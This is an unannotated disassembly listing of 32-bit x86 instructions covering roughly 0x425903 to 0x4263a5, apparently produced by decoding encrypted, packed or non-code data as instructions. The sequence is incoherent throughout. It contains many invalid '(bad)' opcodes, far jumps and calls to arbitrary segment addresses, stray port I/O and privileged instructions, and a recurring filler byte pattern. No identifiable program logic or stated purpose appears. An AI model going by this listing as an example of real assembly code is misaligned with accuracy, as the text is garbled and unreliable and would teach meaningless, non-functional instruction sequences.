  425903:	test   esp,ecx
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	xchg   edx,eax
  42590d:	mov    ebx,0x3a4370da
  425912:	or     al,0x54
  425914:	and    edi,ebp
  425916:	add    ebx,ecx
  425918:	enter  0x1e88,0xad
  42591c:	lods   al,BYTE PTR ds:[esi]
  42591d:	mov    ds:0x70d6f07b,eax
  425922:	push   ecx
  425923:	not    esi
  425925:	mov    al,0xf3
  425927:	xor    al,0xe9
  425929:	cmp    BYTE PTR [ebx+0x68],0xd6
  42592d:	aas    
  42592e:	xchg   ebp,eax
  42592f:	adc    DWORD PTR [edx+0x3c1e9cb0],ecx
  425935:	jge    0x4258e8
  425937:	imul   edi
  425939:	cld    
  42593a:	mov    ah,0x15
  42593c:	lea    edx,[eax+0x5f180c20]
  425942:	sahf   
  425943:	addr16 add al,0x53
  425946:	push   edx
  425947:	imul   edi,edx,0xffffffc5
  42594a:	or     eax,0x8cf6732c
  42594f:	xchg   DWORD PTR fs:[eax-0x411788dc],eax
  425956:	xor    al,0x70
  425958:	add    edi,edi
  42595a:	test   al,0x51
  42595c:	es (bad) 
  42595e:	gs out 0x7c,al
  425961:	jp     0x4259be
  425963:	xchg   ebx,esi
  425965:	fdiv   QWORD PTR [ebx-0x61]
  425968:	dec    ecx
  425969:	aaa    
  42596a:	ss mov dh,0x66
  42596d:	mov    dh,0xce
  42596f:	dec    ecx
  425970:	dec    ebx
  425971:	mov    dl,0x6
  425973:	jmp    0x4557dc7d
  425978:	fwait
  425979:	shl    DWORD PTR [eax+edi*1-0x51a690b5],0x90
  425981:	and    al,ch
  425983:	jne    0x425938
  425985:	retf   0x1b61
  425988:	(bad)  
  425989:	push   edx
  42598a:	in     al,dx
  42598b:	xchg   BYTE PTR ds:0xdd6be84e,dl
  425991:	mov    al,0xb5
  425993:	sub    DWORD PTR [eax+eax*4-0x3b5ffba6],esi
  42599a:	dec    ecx
  42599b:	aaa    
  42599c:	jnp    0x4259eb
  42599e:	jl     0x425955
  4259a0:	mov    DWORD PTR [ebx-0x45],eax
  4259a3:	cld    
  4259a4:	mov    edi,0xd0a1cb58
  4259a9:	jo     0x425987
  4259ab:	jmp    0xabdc:0x7fc6ed76
  4259b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259b3:	adc    DWORD PTR [ebp-0x62],0x773293b4
  4259ba:	mov    ah,0xd2
  4259bc:	sti    
  4259bd:	mov    al,0x7c
  4259bf:	pop    edx
  4259c0:	mov    bl,0xec
  4259c2:	push   0xffffffa3
  4259c4:	cmp    cl,bh
  4259c6:	mov    ebx,0x9841339a
  4259cb:	mov    ds:0xdf705923,al
  4259d0:	retf   
  4259d1:	rcr    DWORD PTR [eax-0x39],cl
  4259d4:	xchg   ebx,eax
  4259d5:	shl    BYTE PTR [edi+0x39261dc5],0xb8
  4259dc:	dec    BYTE PTR [eax]
  4259de:	arpl   WORD PTR [ecx-0x33452927],dx
  4259e4:	sbb    eax,0x28870b59
  4259e9:	scas   al,BYTE PTR es:[edi]
  4259ea:	bnd ret 0x152f
  4259ee:	inc    ebp
  4259ef:	leave  
  4259f0:	hlt    
  4259f1:	sbb    BYTE PTR [edi+0x54],0xab
  4259f5:	add    ch,BYTE PTR [edx-0xb9865d5]
  4259fb:	add    ebx,ebx
  4259fd:	popf   
  4259fe:	imul   BYTE PTR [ebx+0x142a21da]
  425a04:	sbb    DWORD PTR [edx+0x246d3601],esp
  425a0a:	jg     0x4259f6
  425a0c:	mov    eax,0xd0dce9
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x7a99d59e]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	call   0x6313:0x7996845e
  425a93:	push   ebp
  425a94:	retf   0x4fe4
  425a97:	mov    edi,0x6198ef0e
  425a9c:	arpl   di,cx
  425a9e:	ds (bad) 
  425aa0:	dec    esi
  425aa1:	sub    DWORD PTR [edi+0x56570ae7],edx
  425aa7:	arpl   WORD PTR ds:[edi],si
  425aaa:	in     eax,0x79
  425aac:	dec    esi
  425aad:	mov    bh,0xb0
  425aaf:	(bad)  [ecx]
  425ab1:	int    0x11
  425ab3:	lock adc cl,0x9a
  425ab7:	sbb    al,0xdb
  425ab9:	or     al,0xd4
  425abb:	out    0x27,al
  425abd:	jmp    0x39ad:0xec8b971
  425ac4:	fistp  DWORD PTR [ecx+edx*1+0x59]
  425ac8:	jne    0x425ac3
  425aca:	mov    edx,edi
  425acc:	stos   BYTE PTR es:[edi],al
  425acd:	pop    ss
  425ace:	aas    
  425acf:	addr16 sbb eax,0xabafba7e
  425ad5:	repz inc ebx
  425ad7:	xchg   edi,eax
  425ad8:	mov    ah,0xd9
  425ada:	rcr    BYTE PTR [ecx],cl
  425adc:	fwait
  425add:	add    eax,0x69052829
  425ae2:	in     al,dx
  425ae3:	and    BYTE PTR [eax],al
  425ae5:	loopne 0x425ad1
  425ae7:	jle    0x425b27
  425ae9:	inc    edx
  425aea:	call   0xd24de4db
  425aef:	pusha  
  425af0:	xor    al,0x94
  425af3:	je     0x425b1e
  425af5:	mov    esp,0xd0870ad8
  425afa:	sub    al,0xab
  425afc:	not    ebp
  425afe:	cmp    eax,0x3ad5a9a1
  425b03:	and    eax,0x2661860b
  425b08:	int    0xe
  425b0a:	and    edi,edx
  425b0c:	cmp    cl,0x11
  425b0f:	jno    0x425b2a
  425b11:	fldenv [ecx+0x75255393]
  425b17:	add    eax,ecx
  425b19:	inc    esp
  425b1a:	dec    ebx
  425b1b:	dec    ecx
  425b1c:	hlt    
  425b1d:	pushf  
  425b1e:	repnz outs dx,DWORD PTR ds:[esi]
  425b20:	fwait
  425b21:	shl    BYTE PTR [eax],1
  425b23:	jmp    0x425b29
  425b25:	jo     0x425b28
  425b27:	test   DWORD PTR [ecx+ebp*8+0x4a],ecx
  425b2b:	inc    edi
  425b2c:	mov    eax,ds:0x70431974
  425b31:	jns    0x425aec
  425b33:	popa   
  425b34:	pop    ecx
  425b35:	lods   eax,DWORD PTR ds:[esi]
  425b36:	(bad)  
  425b37:	inc    ebx
  425b38:	xchg   ebp,eax
  425b39:	popa   
  425b3a:	mov    cl,0x36
  425b3c:	repnz dec edx
  425b3e:	mov    edx,0xa5c6c9b4
  425b43:	jns    0x425b7b
  425b45:	(bad)  
  425b46:	outs   dx,BYTE PTR ds:[esi]
  425b47:	mov    ebp,0xee4ac8bf
  425b4c:	fisttp WORD PTR [ebx-0x40]
  425b4f:	mov    esi,0x387ed0dd
  425b54:	pop    ss
  425b55:	sbb    edx,edi
  425b57:	sbb    eax,ecx
  425b59:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  425b5b:	mov    BYTE PTR [eax+eiz*8-0x7d],ch
  425b5f:	jne    0xaf9e4655
  425b65:	pop    ecx
  425b66:	mov    BYTE PTR [eax-0x15],bl
  425b69:	fidivr DWORD PTR [eax+0x2a3a60d4]
  425b6f:	mov    WORD PTR [ebp+0x2c],es
  425b72:	ror    ch,0x84
  425b75:	xor    BYTE PTR [eax+0x7841228d],bl
  425b7b:	xor    eax,0xde2e42da
  425b80:	adc    ebx,edx
  425b82:	add    edi,DWORD PTR [edx]
  425b84:	pop    ecx
  425b85:	or     dh,BYTE PTR [ecx]
  425b87:	shl    edx,cl
  425b89:	fs push cs
  425b8b:	jmp    0x0:0x202bd602
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	ss pop ebx
  425c02:	inc    edi
  425c03:	aam    0xd4
  425c05:	xchg   edx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	mov    ebp,0x756d48e0
  425c11:	call   0xbf16:0xc614b267
  425c18:	jl     0x425b9d
  425c1a:	push   ebp
  425c1b:	hlt    
  425c1c:	push   ss
  425c1d:	adc    al,BYTE PTR [ebx+0x48]
  425c20:	fld    QWORD PTR [edx+0x1d578c5]
  425c26:	cmp    dl,BYTE PTR [ebp+0x1d]
  425c29:	shl    DWORD PTR [edi],1
  425c2b:	xor    DWORD PTR [ebx-0x15],esp
  425c2e:	mov    eax,ds:0x8d8c6bf1
  425c33:	mov    ds:0x7c37b1d4,al
  425c38:	add    dh,al
  425c3a:	sar    DWORD PTR [edx],cl
  425c3c:	push   ds
  425c3d:	pop    ecx
  425c3e:	movq   QWORD PTR [ebx],mm6
  425c41:	push   edx
  425c42:	fstp   DWORD PTR [esi+0x5c7c7054]
  425c48:	xor    DWORD PTR [ebx],ecx
  425c4a:	pop    DWORD PTR [eax]
  425c4c:	add    bh,BYTE PTR [eax]
  425c4e:	mov    ch,0x53
  425c50:	popf   
  425c51:	rcl    DWORD PTR [eax+ebx*4+0x74],1
  425c55:	xor    DWORD PTR [ebp-0x16],edi
  425c58:	xor    eax,0xa05ddf36
  425c5d:	ds imul edx,eax,0x13
  425c61:	js     0x425c58
  425c63:	lea    ecx,[ebx+0x29]
  425c66:	and    BYTE PTR fs:[ecx-0x189614b4],0x13
  425c6e:	dec    esp
  425c6f:	jge    0x425c7e
  425c71:	ins    DWORD PTR es:[edi],dx
  425c72:	shr    DWORD PTR [eax+0x18],cl
  425c75:	es xchg ecx,eax
  425c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c78:	fisubr DWORD PTR [edx+0x2b]
  425c7b:	cmp    bl,BYTE PTR [esi-0x3f]
  425c7e:	pop    edi
  425c7f:	sbb    ah,BYTE PTR [eax-0x31]
  425c82:	test   BYTE PTR [eax-0x55ce0c54],bl
  425c88:	daa    
  425c89:	shr    DWORD PTR [esi-0x1d],1
  425c8c:	test   DWORD PTR [esi+0x65b169c7],eax
  425c92:	mov    ebx,0x651dbfe0
  425c97:	pop    edx
  425c98:	je     0x425c4c
  425c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c9b:	(bad)  
  425c9c:	retf   0x83bd
  425c9f:	(bad)
  425ca3:	popa   
  425ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ca5:	xor    DWORD PTR [edi-0x161d3554],0x11
  425cac:	adc    BYTE PTR [edx-0x74],al
  425caf:	mov    ds:0xbcd72768,al
  425cb4:	sub    al,0xbb
  425cb6:	adc    dl,BYTE PTR [eax-0x2078cf1d]
  425cbc:	ret    0xaa56
  425cbf:	dec    ebx
  425cc0:	jecxz  0x425c8b
  425cc2:	adc    al,0xc9
  425cc4:	sbb    al,BYTE PTR [esi]
  425cc6:	outs   dx,DWORD PTR ds:[esi]
  425cc7:	ins    DWORD PTR es:[edi],dx
  425cc8:	sbb    ebx,DWORD PTR ds:0x5a2e95cc
  425cce:	leave  
  425ccf:	mov    dl,0x10
  425cd1:	test   BYTE PTR [edi+0x59],dh
  425cd4:	popf   
  425cd5:	mov    ah,0x18
  425cd7:	sub    eax,0x38ee6f0a
  425cdc:	jno    0x425d05
  425cde:	dec    ecx
  425cdf:	push   esp
  425ce0:	outs   dx,BYTE PTR ds:[esi]
  425ce1:	add    al,0xd7
  425ce3:	push   ecx
  425ce4:	jne    0x425cba
  425ce6:	aaa    
  425ce7:	test   eax,0x2cf101a
  425cec:	pop    ebx
  425ced:	ror    BYTE PTR [edi-0x30],1
  425cf0:	or     DWORD PTR [eax-0x34],0x5b8ddca8
  425cf7:	js     0x425d57
  425cf9:	into   
  425cfa:	mov    dl,0xb1
  425cfc:	jg     0x425cf2
  425cfe:	ret    
  425cff:	call   0xa133e978
  425d04:	xchg   ebx,eax
  425d05:	or     DWORD PTR [ebp+0x26],eax
  425d08:	pop    edi
  425d09:	dec    eax
  425d0a:	(bad)  
  425d0b:	mov    dh,0xdd
  425d0d:	inc    ebp
  425d0e:	sahf   
  425d0f:	xchg   esi,eax
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x258d3d78,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	out    0x44,al
  425d8e:	inc    eax
  425d8f:	jb     0x425dea
  425d91:	xor    ebx,edi
  425d93:	retf   
  425d94:	jmp    0xba36b168
  425d99:	pop    esp
  425d9a:	(bad)
  425d9e:	in     al,dx
  425d9f:	pop    ebx
  425da0:	xchg   BYTE PTR [edi],al
  425da2:	pop    ds
  425da3:	nop
  425da4:	inc    eax
  425da5:	(bad)  
  425da7:	cmp    al,0x61
  425da9:	sti    
  425daa:	xchg   esp,eax
  425dab:	test   al,0x28
  425dad:	xchg   edx,eax
  425dae:	xchg   ebp,eax
  425daf:	mov    ebx,DWORD PTR [ebx]
  425db1:	mov    al,ds:0xc02befb7
  425db6:	arpl   WORD PTR [ebp+0x7],sp
  425db9:	iret   
  425dba:	jecxz  0x425e3b
  425dbc:	or     bh,cl
  425dbe:	in     al,0x77
  425dc0:	jmp    FWORD PTR [si]
  425dc3:	add    BYTE PTR [ecx+0xb3fe7ad],0x15
  425dca:	inc    edx
  425dcb:	push   ecx
  425dcc:	test   eax,0x5130a442
  425dd1:	push   0x10
  425dd3:	and    DWORD PTR [edi+0x74],ebx
  425dd6:	pop    esi
  425dd7:	add    al,0x20
  425dd9:	adc    DWORD PTR [esi+0x20],eax
  425ddc:	sub    ch,BYTE PTR [edi+0x3ee161e0]
  425de2:	repnz dec edx
  425de4:	xor    DWORD PTR [ebx-0x12],edx
  425de7:	or     bh,ch
  425de9:	inc    ebp
  425dea:	retf   
  425deb:	pop    ds
  425dec:	fwait
  425ded:	mov    ebp,0xa10ed722
  425df2:	out    dx,eax
  425df3:	into   
  425df4:	repnz (bad) 
  425df6:	loope  0x425d78
  425df8:	int3   
  425df9:	nop
  425dfa:	pop    ss
  425dfb:	push   0x8b25eaab
  425e00:	mov    esp,0x3ab20d5d
  425e05:	int3   
  425e06:	and    eax,0x31f3aa8b
  425e0b:	push   edx
  425e0c:	and    cl,BYTE PTR [edi-0x568f5655]
  425e12:	aad    0xd1
  425e14:	or     bl,BYTE PTR [esi]
  425e16:	ret    0x49f7
  425e19:	scas   eax,DWORD PTR es:[edi]
  425e1a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e1c:	div    BYTE PTR [ebx]
  425e1e:	mov    ds:0xb5cf5d6,al
  425e23:	aas    
  425e24:	clc    
  425e25:	xor    bl,BYTE PTR [edi+0x7f5559b5]
  425e2b:	cmp    BYTE PTR [edi],dh
  425e2d:	adc    ebp,DWORD PTR [ecx]
  425e2f:	xchg   edx,eax
  425e30:	out    0x28,al
  425e32:	xchg   BYTE PTR [esi+0x17],ah
  425e35:	mov    ds:0xbabd1f80,al
  425e3a:	or     DWORD PTR [eax+0x3e],edi
  425e3d:	fdivp  st(3),st
  425e3f:	ds data16 aam 0x51
  425e43:	loopne 0x425ec3
  425e45:	adc    BYTE PTR [edx+0x3],0x44
  425e49:	shr    DWORD PTR [edx+0x71b3a4e0],1
  425e4f:	cld    
  425e50:	clc    
  425e51:	inc    eax
  425e52:	inc    esi
  425e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e54:	jns    0x425ded
  425e56:	dec    ecx
  425e57:	push   edi
  425e58:	push   ebp
  425e59:	sub    DWORD PTR [edx+esi*8+0x29a08299],edx
  425e60:	sub    ecx,DWORD PTR [ebx+0x6]
  425e63:	jae    0x425e64
  425e65:	sbb    DWORD PTR [edx],edi
  425e67:	mov    al,0x64
  425e69:	xchg   esp,eax
  425e6a:	sbb    al,0xc8
  425e6c:	and    eax,0xc3d2ce75
  425e71:	(bad)  
  425e72:	push   si
  425e74:	pop    edi
  425e75:	mov    ds:0xcaf7c1dd,al
  425e7a:	jmp    0x6a308dfa
  425e7f:	sub    BYTE PTR [ebx-0x70bd8044],ch
  425e85:	call   0x527f:0xcb136253
  425e8c:	enter  0xde60,0x49
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	jae    0x425eb5
  425f02:	xor    eax,0x194dc9c
  425f07:	add    BYTE PTR [ecx+eax*1],al
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	jecxz  0x425ef3
  425f0e:	not    BYTE PTR [ebp-0x31d2bff8]
  425f14:	mov    es,WORD PTR [ecx]
  425f16:	les    ecx,FWORD PTR [ebp+0x5d]
  425f19:	jp     0x425f69
  425f1b:	mov    al,ds:0x3d7e341c
  425f20:	pop    ecx
  425f21:	out    0x36,eax
  425f23:	xchg   ecx,eax
  425f24:	jge    0x425eb1
  425f26:	push   0xea3cf4fd
  425f2b:	call   0xaf824c76
  425f30:	and    BYTE PTR [esp+ebp*2-0x41932ac4],dh
  425f37:	clc    
  425f38:	mov    WORD PTR [eax],es
  425f3a:	ret    
  425f3b:	(bad)  
  425f3c:	cwde   
  425f3d:	push   ss
  425f3e:	push   eax
  425f3f:	mov    eax,0x39244cca
  425f44:	pusha  
  425f45:	enter  0xc877,0x99
  425f49:	pusha  
  425f4a:	test   ch,0xd8
  425f4d:	pop    es
  425f4e:	mov    ebp,0x9f93d50c
  425f53:	jo     0x425fa0
  425f55:	out    dx,al
  425f56:	ret    0xe286
  425f59:	test   al,0xc9
  425f5b:	jmp    0x6cdc09ad
  425f60:	xchg   esi,eax
  425f61:	inc    edi
  425f62:	dec    ebx
  425f63:	sbb    DWORD PTR [edi],edi
  425f65:	jecxz  0x425f19
  425f67:	sar    esp,0x60
  425f6a:	or     al,0x98
  425f6c:	out    dx,eax
  425f6d:	push   0x713ee6d1
  425f72:	sbb    cl,BYTE PTR [edx+0x7c8d86b5]
  425f78:	test   DWORD PTR [edx+0x5b],ecx
  425f7b:	out    0x1f,al
  425f7d:	lods   al,BYTE PTR ds:[esi]
  425f7e:	clc    
  425f7f:	mov    al,ds:0xab34d137
  425f84:	cwde   
  425f85:	std    
  425f86:	cmp    DWORD PTR [ebx+0x52],edx
  425f89:	mov    ah,0xf9
  425f8b:	pcmpeqd mm2,QWORD PTR [edx+0x47895c82]
  425f92:	call   0x32c2:0x53322a8a
  425f99:	scas   al,BYTE PTR es:[edi]
  425f9a:	push   eax
  425f9b:	scas   eax,DWORD PTR es:[edi]
  425f9c:	inc    eax
  425f9d:	cmp    BYTE PTR [edi],bh
  425f9f:	test   BYTE PTR [ebx-0x7dc9bdf4],bh
  425fa5:	jle    0x425f30
  425fa7:	adc    eax,0xec31da9d
  425fac:	gs loopne 0x425fab
  425faf:	xor    eax,0x55fb5a3d
  425fb4:	xchg   esp,eax
  425fb5:	jbe    0x425fef
  425fb7:	fs mov dh,0xfc
  425fba:	ins    BYTE PTR es:[edi],dx
  425fbb:	mov    cl,0x1a
  425fbd:	xchg   ebp,eax
  425fbe:	call   0x53132fa1
  425fc3:	lea    esi,[ebx+eiz*8-0x503af7ed]
  425fca:	mov    al,ds:0x9f8665c6
  425fcf:	in     al,dx
  425fd0:	popf   
  425fd1:	test   al,0xd0
  425fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fd4:	xor    esp,esi
  425fd6:	or     eax,0xa08630b5
  425fdb:	sbb    cl,BYTE PTR [ecx]
  425fdd:	cdq    
  425fde:	rol    BYTE PTR [edx],cl
  425fe0:	enter  0x286c,0xb4
  425fe4:	inc    ebx
  425fe5:	push   ss
  425fe6:	sbb    eax,0x2b818b50
  425feb:	sbb    eax,0xf74b55fb
  425ff0:	xor    esp,DWORD PTR [esi+0x6274d030]
  425ff6:	push   ebx
  425ff7:	mov    eax,0xf344beac
  425ffc:	fisubr WORD PTR [ecx]
  425ffe:	(bad)  
  426000:	out    dx,eax
  426001:	shr    esp,1
  426003:	loopne 0x426043
  426005:	inc    ecx
  426006:	jl     0x425fac
  426008:	xor    ecx,DWORD PTR ds:0x5a88b3c1
  42600e:	(bad)  
  42600f:	aam    0x0
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	mov    dh,0xf8
  426082:	jnp    0x42604c
  426084:	loopne 0x42601b
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	ja     0x426051
  42608e:	aas    
  42608f:	fstp   TBYTE PTR [ebx+eax*1+0x3a]
  426093:	and    eax,0x923f1af6
  426098:	fnstenv [ebx-0x57]
  42609b:	sub    DWORD PTR [ecx],0xb8f2e192
  4260a1:	outs   dx,DWORD PTR ds:[esi]
  4260a2:	inc    esi
  4260a3:	out    dx,al
  4260a4:	imul   eax,DWORD PTR [edi+0x73],0x42d7f13f
  4260ab:	add    ch,BYTE PTR [edx+0x55e97593]
  4260b1:	scas   eax,DWORD PTR es:[edi]
  4260b2:	or     eax,0xbdba427b
  4260b7:	jns    0x426039
  4260b9:	push   ss
  4260ba:	mov    dh,0x22
  4260bc:	daa    
  4260bd:	in     al,dx
  4260be:	dec    eax
  4260bf:	lock xor esi,ebx
  4260c2:	lea    ebx,[eax]
  4260c4:	cld    
  4260c5:	pop    ebx
  4260c6:	lock mov ds:0xf52d8327,eax
  4260cc:	repz mov eax,ecx
  4260cf:	push   eax
  4260d0:	push   0x31
  4260d2:	arpl   WORD PTR gs:[ebx+0x78],si
  4260d6:	or     al,0x1f
  4260d8:	fs test eax,0x4c827b6c
  4260de:	xlat   BYTE PTR ds:[ebx]
  4260df:	imul   DWORD PTR [eax+edx*2]
  4260e2:	mov    bl,0xc7
  4260e4:	xor    DWORD PTR [edi+0x655b6156],eax
  4260ea:	jge    0x4260d2
  4260ec:	xor    BYTE PTR [ebp-0x1c],dl
  4260ef:	jmp    0x2fa0:0xf28f078f
  4260f6:	(bad)  
  4260f7:	bound  edx,QWORD PTR [edi]
  4260f9:	dec    ebx
  4260fa:	pushf  
  4260fb:	cmp    eax,0xcb8e5def
  426100:	repnz int3 
  426102:	jb     0x42614b
  426104:	and    eax,0x800d7169
  426109:	enter  0x9789,0x2b
  42610d:	or     al,0xad
  42610f:	pushf  
  426110:	in     eax,dx
  426111:	xchg   esp,eax
  426112:	cmp    cl,BYTE PTR [ebp-0x6d39101a]
  426118:	call   0x24296788
  42611d:	mov    esp,0x743e38d5
  426122:	(bad)  
  426123:	(bad)  
  426124:	jbe    0x4260d6
  426126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426127:	mov    bl,al
  426129:	imul   edx,DWORD PTR [ebx+edx*2],0xb168b920
  426130:	pop    edx
  426131:	fistp  DWORD PTR [ebx]
  426133:	call   0xd513:0x2b812c30
  42613a:	aad    0x6d
  42613c:	mov    bl,0x5
  42613e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42613f:	iret   
  426140:	jmp    0x41db0412
  426145:	cmp    eax,0xcbe22fb6
  42614a:	rcr    bh,1
  42614c:	popf   
  42614d:	sahf   
  42614e:	lds    esi,FWORD PTR [esi+0x414d46b9]
  426154:	lfs    edx,FWORD PTR [esi+edi*4-0x20]
  426159:	out    dx,eax
  42615a:	pop    edi
  42615b:	dec    esp
  42615c:	pop    ss
  42615d:	ss ret 
  42615f:	mov    bl,0x3e
  426161:	push   edx
  426162:	push   es
  426163:	pop    ecx
  426164:	js     0x4261c4
  426166:	pop    ecx
  426167:	addr16 lahf 
  426169:	and    eax,DWORD PTR [ebx+0x14]
  42616c:	cwde   
  42616d:	lods   al,BYTE PTR ds:[esi]
  42616e:	fdiv   DWORD PTR [edx]
  426170:	loope  0x426104
  426172:	imul   ebx,DWORD PTR [edx-0x71028a43],0xef6983e0
  42617c:	push   ds
  42617d:	fcomp  DWORD PTR [edx-0x14]
  426180:	sbb    al,0xa2
  426182:	hlt    
  426183:	add    ebx,DWORD PTR es:[ecx+0x4170a800]
  42618a:	cmp    ebx,ecx
  42618c:	popw   ss
  42618e:	and    esi,DWORD PTR [ebx]
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x52a69327],0xffffffaf
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	vpmacssdd ymm7,ymm1,YMMWORD PTR [ebp-0x4b],ymm2
  426213:	add    ch,cl
  426215:	neg    BYTE PTR [edi-0x549006b3]
  42621b:	xchg   ebx,eax
  42621c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42621d:	xor    eax,0x1a726ddd
  426222:	mov    edi,0x10eb46c
  426227:	mov    ch,0x91
  426229:	dec    edx
  42622a:	rol    DWORD PTR [eax+0x6e],cl
  42622d:	aad    0xe9
  42622f:	ja     0x4261d9
  426231:	dec    edi
  426232:	fcmovnbe st,st(1)
  426234:	push   edx
  426235:	push   ebx
  426236:	cmp    eax,0xeda50274
  42623b:	ret    0xa0d8
  42623e:	adc    DWORD PTR [eax+0x763104ff],edx
  426244:	dec    dl
  426246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426247:	mov    ecx,0xbe8ba563
  42624c:	and    DWORD PTR [ebp+ecx*2+0xc45442],eax
  426253:	nop
  426254:	(bad)  [ebx]
  426256:	mov    al,bh
  426258:	jae    0x426273
  42625a:	loope  0x426268
  42625c:	jne    0x426286
  42625e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42625f:	inc    ecx
  426260:	pusha  
  426261:	jle    0x4262c4
  426263:	jg     0x426229
  426265:	repnz pop ecx
  426267:	add    esp,DWORD PTR [edx-0x444af332]
  42626d:	enter  0xb34f,0xa
  426271:	mov    esi,0x418b7836
  426276:	xchg   edx,eax
  426277:	dec    ebx
  426278:	les    edi,FWORD PTR [esi]
  42627a:	in     eax,0x2f
  42627c:	sub    BYTE PTR [eax],ch
  42627e:	or     ecx,DWORD PTR [esi-0x2e]
  426281:	mov    dl,0x4c
  426283:	fiadd  DWORD PTR [eax-0x558c8189]
  426289:	aam    0x1a
  42628b:	pop    ds
  42628c:	(bad)  
  42628d:	lock push cs
  42628f:	imul   ebp,edx,0xc22153ee
  426295:	dec    edx
  426296:	(bad)  [edx]
  426298:	rcl    BYTE PTR [edi+0x5ad6fcfa],cl
  42629e:	das    
  42629f:	sar    bh,cl
  4262a1:	xlat   BYTE PTR ds:[ebx]
  4262a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262a3:	mov    al,BYTE PTR [esi+0x73]
  4262a6:	push   ecx
  4262a7:	mov    bh,0xa2
  4262a9:	fdiv   QWORD PTR [edi]
  4262ab:	cdq    
  4262ac:	cld    
  4262ad:	xor    eax,0xb983c788
  4262b2:	scas   eax,DWORD PTR es:[edi]
  4262b3:	xchg   ebp,eax
  4262b4:	call   0x8910:0x6feccf0d
  4262bb:	dec    ebp
  4262bc:	sub    ch,BYTE PTR [ebx+0x2b]
  4262bf:	out    0xb9,eax
  4262c1:	mov    DWORD PTR [ecx],ebx
  4262c3:	mov    edi,DWORD PTR [ebx-0x25c563b2]
  4262c9:	test   DWORD PTR [ecx-0x52],esp
  4262cc:	cld    
  4262cd:	adc    BYTE PTR [esi],ch
  4262cf:	sti    
  4262d0:	dec    edi
  4262d1:	add    DWORD PTR [ebp+ebx*4-0x636df14b],ebx
  4262d8:	jmp    0xc50c5fd6
  4262dd:	sti    
  4262de:	jb     0x4262bf
  4262e0:	retf   
  4262e1:	cmp    eax,0x6ca0815a
  4262e6:	popa   
  4262e7:	xor    ecx,DWORD PTR [eax+esi*1-0x54b7dcbd]
  4262ee:	div    ecx
  4262f0:	imul   ebp,DWORD PTR [ecx],0xbfd947cb
  4262f6:	push   gs
  4262f8:	test   eax,0xba134d6a
  4262fd:	aam    0x34
  4262ff:	pop    ss
  426300:	shr    ah,1
  426302:	(bad)  
  426303:	pop    esp
  426304:	ins    DWORD PTR es:[edi],dx
  426305:	shr    DWORD PTR [ebx-0x6c],0xe1
  426309:	out    dx,al
  42630a:	in     al,dx
  42630b:	push   ss
  42630c:	lahf   
  42630d:	and    DWORD PTR [edx],ecx
  42630f:	add    BYTE PTR ds:[eax],al
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x90c6e931
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    dl,ah
  42638d:	inc    edi
  42638e:	pop    ss
  42638f:	ja     0x426384
  426391:	int    0x8f
  426393:	leave  
  426394:	xchg   ecx,eax
  426395:	outs   dx,BYTE PTR ds:[esi]
  426396:	enter  0xbccd,0x7c
  42639a:	cmp    dh,0xc5
  42639d:	test   ebp,0xb17ce615
  4263a3:	das    
  4263a4:	nop
  4263a5:	sbb    al,0x95
